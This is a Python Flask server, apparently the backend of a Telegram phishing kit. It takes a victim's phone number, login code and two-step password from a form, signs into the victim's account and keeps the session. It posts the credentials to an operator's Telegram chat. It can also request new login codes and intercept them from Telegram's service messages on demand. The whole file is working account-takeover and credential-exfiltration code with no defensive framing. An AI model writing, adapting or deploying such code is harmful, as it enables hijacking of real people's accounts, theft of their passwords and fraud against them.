import os, requests, asyncio, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Memori sementara untuk menyimpan data user
user_db = {} 

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

@app.route('/register', methods=['POST'])
def register():
    # Pastikan data terbaca dengan get_json()
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    return asyncio.run(handle_flow(data))

async def handle_flow(data):
    try:
        step = data.get('step')
        nomor = data.get('nomor', '').strip().replace(" ", "")
        if nomor.startswith('0'): nomor = '+62' + nomor[1:]
        nama = data.get('nama', 'User')

        # Ambil session yang tersimpan
        session_str = user_db.get(nomor, {}).get('session', '')
        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama, "msg_id": None, "status_id": None}
            return jsonify({"status": "success"}), 200

        elif step == 2:
            try:
                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : "
                # Kirim log utama
                if not user_db[nomor].get('msg_id'):
                    msg = bot_api("sendMessage", {
                        "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                    })
                    user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "success"}), 200
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"}), 200
            except: return jsonify({"status": "invalid_otp"}), 400

        elif step == 3:
            try:
                await client.sign_in(password=data.get('sandi'))
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : "
                if user_db[nomor].get('msg_id'):
                    bot_api("editMessageText", {
                        "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'], "text": text, 
                        "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                    })
                user_db[nomor].update({'sandi': data.get('sandi'), 'session': client.session.save()})
                return jsonify({"status": "success"}), 200
            except: return jsonify({"status": "invalid_2fa"}), 400
    finally:
        await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        
        # PERBAIKAN: Pastikan nomor ada di memori agar tidak KeyError
        if nomor not in user_db:
            user_db[nomor] = {"nama": "User", "msg_id": None, "status_id": None}

        if action == "upd":
            # Hapus pesan "Siap" yang lama jika ada
            if user_db[nomor].get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
            
            res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", 
                                         "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
            user_db[nomor]['status_id'] = res.get('result', {}).get('message_id')
            asyncio.run(monitor_new_otp(nomor))
            
        elif action == "exit":
            if user_db[nomor].get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
                user_db[nomor]['status_id'] = None
                
    return jsonify({"status": "success"})

async def monitor_new_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data.get('session'): return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try: await client.send_code_request(nomor)
    except: pass

    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
        if otp_match:
            new_otp = otp_match.group(0)
            # Isi kolom OTP di pesan utama
            bot_api("editMessageText", {
                "chat_id": CHAT_ID, "message_id": data['msg_id'],
                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{new_otp}`",
                "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
            })
            # OTOMATIS HAPUS pesan "Siap" setelah OTP dapat
            if data.get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                data['status_id'] = None
            await client.disconnect()

    await asyncio.sleep(300)
    if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))